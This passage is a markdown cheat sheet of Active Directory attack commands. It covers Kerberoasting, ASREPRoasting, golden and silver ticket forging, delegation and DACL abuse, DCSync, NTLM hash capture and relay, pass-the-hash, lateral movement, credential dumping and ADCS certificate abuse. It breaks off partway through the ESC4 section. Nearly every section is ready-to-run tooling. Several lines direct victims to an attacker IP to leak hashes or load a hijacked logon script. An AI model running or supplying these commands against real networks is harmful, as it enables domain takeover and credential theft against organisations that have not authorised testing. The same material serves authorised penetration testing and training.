---
title: AD Attacks
subtitle: AD ATTACKS

sidebar:
  - label: ENUMERATION
    items:
      - id: ad-enum-win
        text: "Windows Enum"
      - id: ad-enum-linux
        text: "Linux Enum"
      - id: ad-bloodhound
        text: "BloodHound"
  - label: KERBEROS ATTACKS
    items:
      - id: ad-asrep
        text: "ASREPRoasting"
      - id: ad-kerberoast
        text: "Kerberoasting"
      - id: ad-tickets
        text: "Ticket Operations"
      - id: ad-delegation-unc
        text: "Unconstrained Delegation"
      - id: ad-delegation-con
        text: "Constrained Delegation"
      - id: ad-silver
        text: "Silver Ticket"
      - id: ad-golden
        text: "Golden Ticket"
  - label: DACL ATTACKS
    items:
      - id: ad-dacl-enum
        text: "DACL Enumeration"
      - id: ad-genericall
        text: "GenericAll"
      - id: ad-genericwrite
        text: "GenericWrite / WriteProp"
      - id: ad-writedacl
        text: "WriteDACL / WriteOwner"
      - id: ad-dcsync
        text: "DCSync"
  - label: NTLM ATTACKS
    items:
      - id: ad-ntlm-capture
        text: "Capture Hash"
      - id: ad-ntlm-relay
        text: "NTLM Relay"
      - id: ad-pth
        text: "Pass-the-Hash"
  - label: POST COMPROMISE
    items:
      - id: ad-lateral
        text: "Lateral Movement"
      - id: ad-linux-setup
        text: "Linux Kerberos Setup"
  - label: ADCS ATTACKS
    items:
      - id: adcs-enum
        text: "Enumeration"
      - id: adcs-esc1
        text: "ESC1 — SAN Abuse"
      - id: adcs-esc2
        text: "ESC2 — Any Purpose"
      - id: adcs-esc3
        text: "ESC3 — Enroll Agent"
      - id: adcs-esc4
        text: "ESC4 — Template Write"
      - id: adcs-esc6
        text: "ESC6 — SAN CA-wide"
      - id: adcs-esc7
        text: "ESC7 — CA ACL"
      - id: adcs-esc8
        text: "ESC8 — Web Relay"
---

## WINDOWS ENUMERATION
<!-- id: ad-enum-win -->

> Always start with gpresult to confirm the domain controller and your effective group policies. PowerView is the primary enumeration tool — import it once and use across all queries. SharpHound collects everything needed for BloodHound in one shot.

### Domain context

#### cmd | Current domain and DC via Group Policy
```
gpresult /r
```

#### PowerView | Forest and domain overview
```
Import-Module .\PowerView.ps1
Get-NetForest
Get-NetForestDomain
Get-NetDomain
Get-NetDomainController
```

#### PowerView | Trust mapping
```
Invoke-MapDomainTrust
Get-NetDomain -Domain <domain_fqdn>
```

### User and group enumeration

#### PowerView | User and group info
```
Get-NetUser -Identity <username>
Get-DomainGroup -MemberIdentity <username>
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
```

### BloodHound collection (Windows)

#### SharpHound | Collect all data and zip for BloodHound
```
.\sharphound.exe -c All -d <domain_fqdn> --zipfilename sharp_domain.zip
```

## LINUX ENUMERATION
<!-- id: ad-enum-linux -->

> From Linux, impacket tools give you user details and Kerberos PAC data. adidnsdump is excellent for mapping the full internal DNS zone — often reveals hidden hosts not in nmap scans.

### User and domain info

#### impacket-GetADUsers | Dump all domain users
```
impacket-GetADUsers <Domain>/<user>:<pass> -dc-ip <DC_IP> -all
```

#### impacket-getPac | Get Kerberos PAC (group memberships) for a user
```
impacket-getPac <Domain>/<user>:<pass> -targetUser <username>
```

#### nxc | Users, groups, password policy
```
nxc smb <DC_IP> -u <user> -p <pass> --users --groups --pass-pol
```

#### nxc | Logged-on users across subnet
```
nxc smb <Target_IP>/24 -u <user> -p <pass> --loggedon-users
```

### DNS dump

#### adidnsdump | Dump all internal DNS records
```
# https://github.com/dirkjanm/adidnsdump
adidnsdump -u '<Domain>\<user>' -p '<pass>' <domain_fqdn>
```

## BLOODHOUND
<!-- id: ad-bloodhound -->

> BloodHound visualises attack paths through AD. Collect with bloodhound-python from Linux or SharpHound from Windows. Start neo4j first, then BloodHound. Upload the zip and use pre-built queries to find paths to Domain Admin.

### Collection and startup

#### bloodhound-python | Collect from Linux (no agent needed)
```
bloodhound-python -u <user> -p <pass> -ns <DC_IP> -d <domain_fqdn> -c All
# With hash instead of password:
bloodhound-python -u <user> -H <NT_HASH> -ns <DC_IP> -d <domain_fqdn> -c All
```

#### bash | Start BloodHound
```
sudo neo4j console
# In separate terminal:
sudo bloodhound --no-sandbox
```

> References: <a href="https://en.hackndo.com/bloodhound/" target="_blank">BloodHound guide</a> · <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/" target="_blank">Cypher cheatsheet</a>

## ASREPROASTING
<!-- id: ad-asrep -->

> Accounts with pre-authentication disabled expose their AS-REP hash to anyone on the network — no credentials needed. The hash is crackable offline. Service accounts and legacy configurations are common culprits.

### Find vulnerable accounts

#### PowerView | Find accounts with pre-auth disabled
```
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

#### Rubeus | Find and retrieve AS-REP hashes (Windows)
```
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
```

### Retrieve hashes (Linux)

#### impacket-GetNPUsers | With credentials — auto-discovers vulnerable users
```
impacket-GetNPUsers <Domain>/<user>:<pass> -dc-ip <DC_IP> -request -format hashcat -outputfile asrep.hash
```

#### impacket-GetNPUsers | Without credentials — requires username list
```
impacket-GetNPUsers <Domain>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
```

#### nxc | ASREPRoast via LDAP
```
nxc ldap <DC_IP> -u users.txt -p "" --asreproast asrep.hash --kdcHost <DC_FQDN>
```

### Crack

#### hashcat | Crack AS-REP hash
```
hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
```

## KERBEROASTING
<!-- id: ad-kerberoast -->

> Service accounts with SPNs can have their TGS ticket requested by any authenticated domain user. The encrypted portion is crackable offline if the account uses a weak password. RC4 hashes (mode 13100) crack much faster than AES (mode 19700).

### Find SPNs and get hashes

#### PowerView | Find kerberoastable accounts
```
Import-Module .\PowerView.ps1
Get-DomainUser -SPN
```

#### Rubeus | Kerberoast and get hashes (Windows)
```
.\Rubeus.exe kerberoast /nowrap /outfile:kerberoast.hash
# If RC4 is disabled, force downgrade:
.\Rubeus.exe kerberoast /tgtdeleg /nowrap /outfile:kerberoast.hash
```

#### impacket-GetUserSPNs | Request TGS hashes (Linux)
```
impacket-GetUserSPNs <Domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerberoast.hash
```

#### nxc | Kerberoast via LDAP
```
nxc ldap <DC_IP> -u <user> -p <pass> --kerberoasting kerberoast.hash
```

### Crack

#### hashcat | RC4 hash (most common)
```
hashcat -m 13100 -a 0 kerberoast.hash /usr/share/wordlists/rockyou.txt
# Hash starts with $krb5tgs$23$
```

#### hashcat | AES hash
```
hashcat -m 19700 -a 0 kerberoast.hash /usr/share/wordlists/rockyou.txt
# Hash starts with $krb5tgs$18$
```

### Kerberoast without pre-auth (Rubeus)

> If you have a username with DONT_REQ_PREAUTH you can kerberoast other accounts without a valid password.

#### Rubeus | Kerberoast using account without pre-auth
```
.\Rubeus.exe createnetonly /program:cmd.exe /show
.\Rubeus.exe kerberoast /nopreauth:<username> /domain:<domain_fqdn> /spn:<target_spn> /nowrap
# For a list of SPNs: /spns:spns.txt
```

## TICKET OPERATIONS
<!-- id: ad-tickets -->

> Tickets are the key currency in Kerberos environments. Knowing how to export, convert, inject and use tickets across Windows and Linux is essential for lateral movement and persistence.

### Export and inject (Windows)

#### Rubeus | List tickets in current session
```
.\Rubeus.exe klist
```

#### Mimikatz | Export all tickets to disk
```
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

#### Rubeus | Inject a ticket into current session (PTT)
```
.\Rubeus.exe ptt /ticket:<base64_ticket_or_kirbi_file>
```

#### Rubeus | Request TGT with hash and inject
```
.\Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<NT_HASH> /ptt
```

### Convert between formats

#### PowerShell | Base64 string → .kirbi file
```
# Remove all line breaks from base64 first, then:
[IO.File]::WriteAllBytes("C:\Temp\ticket.kirbi", [Convert]::FromBase64String("<base64_ticket>"))
```

#### impacket-ticketConverter | kirbi ↔ ccache
```
# kirbi to ccache (for Linux use):
impacket-ticketConverter ticket.kirbi ticket.ccache

# ccache to kirbi (for Windows use):
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### Use tickets (Linux)

#### bash | Set ticket and use with impacket
```
export KRB5CCNAME=<path>/ticket.ccache
impacket-secretsdump -k -no-pass <DC_FQDN>
impacket-psexec -k -no-pass <Domain>/<user>@<Target_FQDN>
```

#### impacket-getTGT | Request TGT from Linux
```
impacket-getTGT <Domain>/<user>:<pass> -dc-ip <DC_IP>
# or with hash:
impacket-getTGT <Domain>/<user> -hashes :<NT_HASH> -dc-ip <DC_IP>
export KRB5CCNAME=$(pwd)/<user>.ccache
```

## UNCONSTRAINED DELEGATION
<!-- id: ad-delegation-unc -->

> If a computer has unconstrained delegation enabled, any user who authenticates to it has their TGT cached in memory. Combine with the Printer Bug to coerce a DC to authenticate — then steal the DC's TGT and DCSync the domain.

### Find unconstrained delegation

#### PowerView | Find computers with unconstrained delegation
```
Import-Module .\PowerView.ps1
Get-NetComputer -Unconstrained
# Ignore Domain Controllers — they always have it
```

### Method 1 — Wait for privileged user

#### Rubeus | Monitor for incoming TGTs
```
.\Rubeus.exe monitor /interval:5 /nowrap
```

#### Rubeus | Renew and inject captured TGT
```
.\Rubeus.exe renew /ticket:<TGT_base64> /ptt
```

### Method 2 — Printer Bug coercion

> Force a DC to authenticate to your compromised unconstrained delegation host using the MS-RPRN printer spooler service. Rubeus catches the TGT as it arrives.

#### Rubeus | Start monitoring on compromised host
```
.\Rubeus.exe monitor /interval:5 /nowrap
```

#### SpoolSample | Coerce DC authentication (run from any domain host)
```
# https://github.com/leechristensen/SpoolSample
.\SpoolSample.exe <DC_FQDN> <compromised_host_FQDN>
```

#### Rubeus | Renew the captured DC TGT and inject
```
.\Rubeus.exe renew /ticket:<DC_TGT> /ptt
```

### Post-exploitation after capturing DC TGT

#### Mimikatz | DCSync using injected ticket
```
.\mimikatz.exe
lsadump::dcsync /domain:<domain> /all
```

## CONSTRAINED DELEGATION
<!-- id: ad-delegation-con -->

> Constrained delegation lets a service account impersonate any user to specific SPNs. With the account's credentials or hash, you can request a TGS as Administrator for the target service. The /altservice flag lets you change the target service type (e.g. cifs → http).

### Find constrained delegation

#### PowerView | Find accounts with constrained delegation
```
Import-Module .\PowerView.ps1
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
# msds-allowedtodelegateto shows permitted SPNs
```

#### impacket-findDelegation | Find all delegation (Linux)
```
impacket-findDelegation <Domain>/<user>:<pass> -dc-ip <DC_IP>
# Look for: Constrained w/ Protocol Transition
```

### Exploit (Windows — Rubeus)

#### Mimikatz | Get NT hash of the vulnerable account from memory
```
.\mimikatz.exe
privilege::debug
sekurlsa::msv
```

#### Rubeus | S4U attack — impersonate Administrator
```
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:<target_SPN> /user:<vulnerable_user> /rc4:<NT_HASH> /ptt
# Optional: /altservice:cifs to change service type
```

#### cmd | Access target after injecting ticket
```
.\PsExec.exe -accepteula \\<target_FQDN> cmd
Enter-PSSession <target_FQDN>
```

### Exploit (Linux — impacket)

#### impacket-getST | Request impersonated service ticket
```
impacket-getST -spn <target_SPN> -impersonate Administrator -dc-ip <DC_IP> <Domain>/<vulnerable_user>:<pass>
```

#### bash | Use the ticket
```
export KRB5CCNAME=Administrator@<target_SPN>.ccache
impacket-secretsdump -k -no-pass <DC_FQDN>
```

## SILVER TICKET
<!-- id: ad-silver -->

> A Silver Ticket is a forged TGS for a specific service, signed with the service account's NT hash. It never touches the DC — no logs on the DC, but event logs appear on the target host. Useful for accessing specific services when you have a service account hash but not a KDC key.

### Create silver ticket

#### Mimikatz | Get service account hash and domain SID
```
.\mimikatz.exe
privilege::debug
sekurlsa::msv
# or from secretsdump output — you need: NT hash, domain SID, target SPN
```

#### Mimikatz | Forge and inject silver ticket
```
.\mimikatz.exe
kerberos::golden /domain:<domain> /sid:<domain_SID> /target:<target_FQDN> /service:<service> /rc4:<service_NT_HASH> /user:Administrator /ptt
# Common services: cifs, http, host, rpcss, wsman
```

#### impacket-ticketer | Create silver ticket (Linux)
```
impacket-ticketer -nthash <service_NT_HASH> -domain-sid <domain_SID> -domain <Domain> -spn <target_SPN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <Domain>/Administrator@<Target_FQDN>
```

## GOLDEN TICKET
<!-- id: ad-golden -->

> A Golden Ticket is forged using the krbtgt account's NT hash — it can impersonate any user to any service in the domain. krbtgt hash comes from DCSync or NTDS.dit. Tickets are valid for 10 years by default. Requires domain SID and krbtgt hash.

### Obtain krbtgt hash

#### impacket-secretsdump | DCSync to get krbtgt hash
```
impacket-secretsdump <Domain>/<DA_user>:<pass>@<DC_IP> -just-dc-user krbtgt
```

### Create golden ticket

#### Mimikatz | Forge and inject golden ticket (Windows)
```
.\mimikatz.exe
kerberos::golden /domain:<domain> /sid:<domain_SID> /rc4:<krbtgt_NT_HASH> /user:Administrator /ptt
# Or target specific DC:
kerberos::golden /domain:<domain> /sid:<domain_SID> /rc4:<krbtgt_NT_HASH> /user:Administrator /id:500 /groups:512 /ptt
```

#### impacket-ticketer | Create golden ticket (Linux)
```
impacket-ticketer -nthash <krbtgt_NT_HASH> -domain-sid <domain_SID> -domain <Domain> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass <DC_FQDN>
impacket-psexec -k -no-pass <Domain>/Administrator@<DC_FQDN>
```

## DACL ENUMERATION
<!-- id: ad-dacl-enum -->

> DACL misconfigurations are the most common path from a low-privileged user to Domain Admin. BloodHound's "Shortest Path to Domain Admins" query is the fastest way to find them. Manual checks with PowerView confirm and detail the exact rights.

### Enumerate ACLs

#### PowerView | Check ACLs on a specific user
```
Import-Module .\PowerView.ps1
Get-ObjectAcl -SamAccountName <victim> -ResolveGUIDs
```

#### PowerView | Filter for dangerous rights
```
Get-ObjectAcl -SamAccountName <victim> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDACL|WriteOwner|ForceChangePassword"}
```

#### nxc | Read all ACEs for a target object
```
nxc ldap <DC_IP> -u <user> -p <pass> --kdcHost <DC_FQDN> -M daclread -o TARGET=<victim> ACTION=read
```

#### nxc | Find who has DCSync rights
```
nxc ldap <DC_IP> -u <user> -p <pass> --kdcHost <DC_FQDN> -M daclread -o TARGET=<domain_DN> ACTION=read RIGHTS=DCSync
```

## GENERICALL
<!-- id: ad-genericall -->

> GenericAll gives full control over the object. On a user: change password, add SPN for Kerberoasting, disable pre-auth for ASREPRoasting, or Shadow Credentials. On a group: add yourself as a member. On a computer: RBCD or Shadow Credentials.

### Setup attacker credentials object

#### PowerView | Create credential object for attacker account
```
$SecPass = ConvertTo-SecureString '<attacker_password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\<attacker_user>', $SecPass)
```

### GenericAll over a user

#### PowerView | Check who has GenericAll over victim
```
Get-ObjectAcl -SamAccountName <victim> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```

#### PowerView | Force password change on victim
```
$NewPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Credential $Cred -Identity <victim> -AccountPassword $NewPass -Verbose
```

#### PowerView | Add SPN to victim for Kerberoasting
```
Set-DomainObject -Credential $Cred -Identity <victim> -Set @{serviceprincipalname="fake/NOTHING"}
# Kerberoast the user, then clean up:
Set-DomainObject -Credential $Cred -Identity <victim> -Clear serviceprincipalname -Verbose
```

#### PowerView | Disable pre-auth on victim for ASREPRoasting
```
Set-DomainObject -Credential $Cred -Identity <victim> -XOR @{UserAccountControl=4194304}
```

### GenericAll over a group

#### PowerView | Get group distinguishedName
```
Get-NetGroup "<group_name>" -FullData
```

#### PowerView | Add user to group
```
Add-DomainGroupMember -Credential $Cred -Identity "<group_name>" -Members <user_to_add> -Domain "<domain>"
```

## GENERICWRITE / WRITEPROPERTY
<!-- id: ad-genericwrite -->

> GenericWrite lets you modify object attributes. WriteProperty is more specific — it depends on which attribute (ObjectType). Key targets: Script-Path (logon script hijack) and msDS-KeyCredentialLink (Shadow Credentials). On a group: add members. On a computer: RBCD.

### GenericWrite over a user

#### PowerView | Check who has GenericWrite over victim
```
Get-ObjectAcl -SamAccountName <victim> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericWrite"}
```

#### PowerView | Hijack logon script (if Script-Path ObjectType)
```
Set-ADObject -SamAccountName <victim> -PropertyName scriptpath -PropertyValue "\\<attacker_IP>\share\evil.ps1"
```

### GenericWrite / WriteProperty over a group

#### PowerView | Add member to group
```
$SecPass = ConvertTo-SecureString '<attacker_password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\<attacker_user>', $SecPass)
Add-DomainGroupMember -Credential $Cred -Identity "<group_name>" -Members <user_to_add>
```

### RBCD (Resource-Based Constrained Delegation)

> RBCD requires: write rights on msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object + control of an account with an SPN (or create a machine account — default quota is 10 per user).

#### PowerView | Set RBCD — allow attacker-controlled computer to delegate to victim computer
```
$AttackerSID = Get-DomainComputer <attacker_computer> -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <victim_computer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

#### impacket-getST | Impersonate Administrator via RBCD (Linux)
```
impacket-getST -spn cifs/<victim_FQDN> -impersonate Administrator -dc-ip <DC_IP> <Domain>/<attacker_computer>$:<pass>
export KRB5CCNAME=Administrator@cifs_<victim_FQDN>.ccache
impacket-secretsdump -k -no-pass <victim_FQDN>
```

## WRITEDACL / WRITEOWNER
<!-- id: ad-writedacl -->

> WriteDACL lets you modify an object's ACL — grant yourself any right including GenericAll or DCSync. WriteOwner lets you change the object's owner — take ownership then grant yourself full control.

### Exploit WriteDACL

#### PowerView | Grant yourself DCSync rights on the domain object
```
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "<domain_DN>" -PrincipalIdentity <your_user> -Rights DCSync
```

#### PowerView | Grant yourself GenericAll over a user
```
Add-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <your_user> -Rights All
```

### Exploit WriteOwner

#### PowerView | Take ownership then grant yourself GenericAll
```
Set-DomainObjectOwner -Identity <victim> -OwnerIdentity <your_user>
Add-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <your_user> -Rights All
```

## DCSYNC
<!-- id: ad-dcsync -->

> DCSync abuses the directory replication protocol to request password hashes from a DC without running code on it. Requires Replicating Directory Changes + Replicating Directory Changes All rights — Domain Admins and SYSTEM have these by default.

### Check who has DCSync rights

#### PowerView | Find accounts with replication rights
```
Import-Module .\PowerView.ps1
Get-ObjectAcl -DistinguishedName "dc=<domain>,dc=<tld>" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

### Execute DCSync

#### Mimikatz | DCSync all accounts (Windows)
```
.\mimikatz.exe
lsadump::dcsync /domain:<domain> /all
# Single account:
lsadump::dcsync /domain:<domain> /user:krbtgt
```

#### impacket-secretsdump | DCSync from Linux
```
# With password:
impacket-secretsdump <Domain>/<DA_user>:<pass>@<DC_IP> -just-dc -outputfile dcsync_hashes

# With TGT:
export KRB5CCNAME=<path>/ticket.ccache
impacket-secretsdump -k -no-pass <DC_FQDN> -just-dc -outputfile dcsync_hashes
```

## CAPTURE NTLM HASH
<!-- id: ad-ntlm-capture -->

> NTLM hashes can be captured whenever a host tries to authenticate to an attacker-controlled resource. Trigger authentication via a UNC path in a file, an HTML img tag, or by abusing SQL Server's xp_dirtree. Crack with hashcat mode 5600 (NTLMv2).

### Trigger authentication

#### bash | UNC path in a file (plant on a share)
```
# In any file visible to target:
//10.10.14.1/x.jpg
```

#### html | HTML img tag (send to target or host on phishing page)
```
<img src="\\10.10.14.1\x.jpg">
```

#### SQL | Force SQL Server to authenticate via xp_dirtree
```
exec master.dbo.xp_dirtree '\\10.10.14.1\anything\'
```

### Capture with Responder

#### bash | Start Responder to capture hashes
```
sudo responder -I <interface>
# Hashes saved to /usr/share/responder/logs/
```

#### bash | Capture with impacket SMB server (quieter)
```
sudo impacket-smbserver share ./ -smb2support
```

#### hashcat | Crack NTLMv2 hash
```
hashcat -m 5600 -a 0 captured.hash /usr/share/wordlists/rockyou.txt
```

## NTLM RELAY
<!-- id: ad-ntlm-relay -->

> Instead of cracking the hash, relay it to another host for authentication. Requires SMB signing disabled on the target — check with nxc. Turn off SMB and HTTP in Responder (it conflicts with ntlmrelayx), run both tools together.

### Setup relay

#### nxc | Find hosts without SMB signing (relay targets)
```
nxc smb <Target_IP>/24 --gen-relay-list relay_targets.txt
```

#### bash | Run Responder with SMB and HTTP off
```
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
sudo responder -I <interface>
```

#### bash | Run ntlmrelayx with SOCKS proxy
```
sudo impacket-ntlmrelayx -t <target_IP> -smb2support -socks
```

### Use relayed sessions via SOCKS

#### bash | Secret dump via relayed session
```
proxychains impacket-secretsdump -no-pass '<Domain>/<user>'@'<target_IP>'
```

#### bash | SMB access via relayed session
```
proxychains impacket-smbclient -no-pass '<Domain>/<user>'@'<target_IP>'
```

#### bash | Code execution via relayed session
```
proxychains impacket-smbexec -no-pass '<Domain>/<user>'@'<target_IP>'
```

> Reference: <a href="https://en.hackndo.com/ntlm-relay/" target="_blank">NTLM Relay deep dive</a>

## PASS-THE-HASH
<!-- id: ad-pth -->

> Pass-the-Hash works against NTLM authentication — any service using NTLM accepts an NT hash directly. NTLMv1 hashes also work. PTT (Pass-the-Ticket) uses Kerberos tickets instead. Note: PtH does not work against services enforcing Kerberos only.

### Pass-the-Hash

#### nxc | Validate hash across subnet
```
nxc smb <Target_IP>/24 -u <user> -H <NT_HASH> --continue-on-success
```

#### impacket-psexec | SYSTEM shell via PTH
```
impacket-psexec <Domain>/<user>@<Target_IP> -hashes :<NT_HASH>
```

#### impacket-wmiexec | Shell via PTH (quieter — no service drop)
```
impacket-wmiexec <Domain>/<user>@<Target_IP> -hashes :<NT_HASH>
```

#### evil-winrm | WinRM shell via PTH
```
evil-winrm -i <Target_IP> -u <user> -H <NT_HASH>
```

### Pass-the-Ticket

#### impacket-getTGT | Request and export TGT
```
impacket-getTGT <Domain>/<user>:<pass> -dc-ip <DC_IP>
export KRB5CCNAME=$(pwd)/<user>.ccache
```

#### bash | Use ticket for access
```
impacket-psexec -k -no-pass <Domain>/<user>@<Target_FQDN>
impacket-secretsdump -k -no-pass <DC_FQDN>
```

## LATERAL MOVEMENT
<!-- id: ad-lateral -->

> Post-compromise, collect all hashes and tickets before making noisy changes. secretsdump on every reachable host expands your credential cache rapidly.

### Remote execution

#### impacket-psexec | SYSTEM shell via SMB
```
impacket-psexec <Domain>/<user>:<pass>@<Target_IP>
```

#### impacket-wmiexec | Shell via WMI (no service/file drop)
```
impacket-wmiexec <Domain>/<user>:<pass>@<Target_IP>
```

#### impacket-smbexec | Shell via SMB exec
```
impacket-smbexec <Domain>/<user>:<pass>@<Target_IP>
```

#### nxc | Run command across domain
```
nxc smb <Target_IP>/24 -u <user> -p <pass> -x "whoami" --continue-on-success
```

### Credential dumping

#### impacket-secretsdump | Dump SAM + LSA + cached creds
```
impacket-secretsdump <Domain>/<user>:<pass>@<Target_IP>
```

#### nxc | Dump SAM / LSA / NTDS
```
nxc smb <Target_IP> -u <user> -p <pass> --sam
nxc smb <Target_IP> -u <user> -p <pass> --lsa
nxc smb <Target_IP> -u <user> -p <pass> --ntds
```

## LINUX KERBEROS SETUP
<!-- id: ad-linux-setup -->

> When attacking AD from Linux, Kerberos requires DNS resolution of domain names and correct time sync with the DC. Clock skew > 5 minutes causes Kerberos auth failures. Configure /etc/hosts and krb5.conf before using any Kerberos-based tools.

### Configure environment

#### bash | Verify DC SRV record is reachable
```
nslookup -type=srv _ldap._tcp.dc._msdcs.<Domain> <DC_IP>
```

#### bash | Add DC and domain to /etc/hosts
```
echo "<DC_IP> <DC_FQDN> <Domain>" >> /etc/hosts
```

#### bash | Install and configure Kerberos
```
sudo apt install krb5-user
sudo vim /etc/krb5.conf
# Set: default_realm, kdc, admin_server to your domain
```

#### bash | Fix clock skew (Kerberos fails if >5 min off)
```
sudo timedatectl set-ntp 0
sudo ntpdate -qu <DC_IP>
sudo ntpdate <DC_IP>
```

#### bash | Get TGT and set environment
```
impacket-getTGT <Domain>/<user>:<pass> -dc-ip <DC_IP>
export KRB5CCNAME=$(pwd)/<user>.ccache
# Test:
impacket-smbclient -k <DC_FQDN>
```

## ADCS ENUMERATION
<!-- id: adcs-enum -->

> AD CS (Active Directory Certificate Services) is one of the most reliably misconfigured services in Windows environments. A single vulnerable certificate template can give any domain user a path to Domain Admin. Always enumerate ADCS early — certipy does everything from Linux, Certify does the same from Windows.

### Find vulnerable templates

#### certipy | Full ADCS enumeration — find all vulnerable templates
```
certipy find -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -vulnerable -enabled
```

#### certipy | Save results for BloodHound (old BH format)
```
certipy find -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -old-bloodhound
```

#### Certify | Windows equivalent
```
.\Certify.exe find /vulnerable /currentuser
```

#### nxc | List PKI enrolment servers and certificate templates
```
nxc ldap <DC_IP> -u <user> -p <pass> -M adcs
nxc ldap <DC_IP> -u <user> -p <pass> -M adcs -o SERVER=<CA_IP>
```

### Get certificate → NT hash (final step for all ESC attacks)

#### certipy | Authenticate with PFX to get NT hash
```
certipy auth -pfx <cert>.pfx -dc-ip <DC_IP>
# Outputs NT hash and TGT — use either for access
```

## ESC1 — SAN ABUSE (MISCONFIGURED TEMPLATE)
<!-- id: adcs-esc1 -->

> The most common ADCS finding. A template allows the requester to supply an arbitrary Subject Alternative Name (SAN) — meaning you request a cert as yourself but say it belongs to Administrator. Any template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Authentication EKU + low-privilege enrolment rights is vulnerable.

### Requirements
- Template has ENROLLEE_SUPPLIES_SUBJECT flag set
- Template has Client Authentication EKU
- Low-privileged users have Enrol rights

### Exploit

#### certipy | Request certificate as Administrator (Linux)
```
certipy req -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -ca '<CA_Name>' -template '<vulnerable_template>' -upn Administrator@<Domain>
```

#### certipy | Get NT hash from the certificate
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

#### Certify + Rubeus | Windows equivalent
```
.\Certify.exe request /ca:<CA_FQDN>\<CA_Name> /template:<vulnerable_template> /altname:Administrator
# Convert PEM to PFX, then:
.\Rubeus.exe asktgt /user:Administrator /certificate:<cert.pfx> /password:<pfx_pass> /ptt
```

## ESC2 — ANY PURPOSE CERTIFICATE
<!-- id: adcs-esc2 -->

> A template with the "Any Purpose" EKU (or no EKU) lets the holder act as an Enrollment Agent — they can request certificates on behalf of any user. Exploitation mirrors ESC3: get the Any Purpose cert first, then use it to request a Client Auth cert as Administrator.

### Requirements
- Template has Any Purpose EKU or empty EKU
- Low-privileged users have Enrol rights

### Exploit

#### certipy | Step 1 — Get the Any Purpose certificate
```
certipy req -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -ca '<CA_Name>' -template '<ESC2_template>'
```

#### certipy | Step 2 — Use it to request a cert on behalf of Administrator
```
certipy req -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -ca '<CA_Name>' -template 'User' -on-behalf-of '<Domain>\Administrator' -pfx <esc2_cert>.pfx
```

#### certipy | Step 3 — Get NT hash
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## ESC3 — ENROLLMENT AGENT ABUSE
<!-- id: adcs-esc3 -->

> Two templates are needed: one that grants the Certificate Request Agent EKU (allows requesting certs on behalf of others), and a second that allows agent enrolment. Together they let you impersonate any domain user, including Domain Admins.

### Requirements
- Template 1: has Certificate Request Agent EKU, low-priv enrolment
- Template 2: allows agent enrolment (has Client Authentication EKU)

### Exploit

#### certipy | Step 1 — Enrol for the agent certificate
```
certipy req -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -ca '<CA_Name>' -template '<agent_template>'
```

#### certipy | Step 2 — Request cert on behalf of Administrator using agent cert
```
certipy req -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -ca '<CA_Name>' -template '<target_template>' -on-behalf-of '<Domain>\Administrator' -pfx <agent_cert>.pfx
```

#### certipy | Step 3 — Get NT hash
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## ESC4 — WRITE PERMISSIONS ON TEMPLATE
<!-- id: adcs-esc4 -->

> If you have write rights on a template (Owner, WriteDACL, WriteProperty, or WriteOwner), you can modify it to be vulnerable to ESC1. Always use -save-old to preserve the original config — you're modifying the live template in AD and need to restore it afterwards.

### Requirements
- User has Owner / WriteDACL / WriteProperty / WriteOwner on a template

### Exploit

#### certipy | Step 1 — Save original config and make template vulnerable to ESC1
```
certipy template -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -template '<target_template>' -save-old
```

#### certipy | Step 2 — Request cert as Administrator (now ESC1)
```
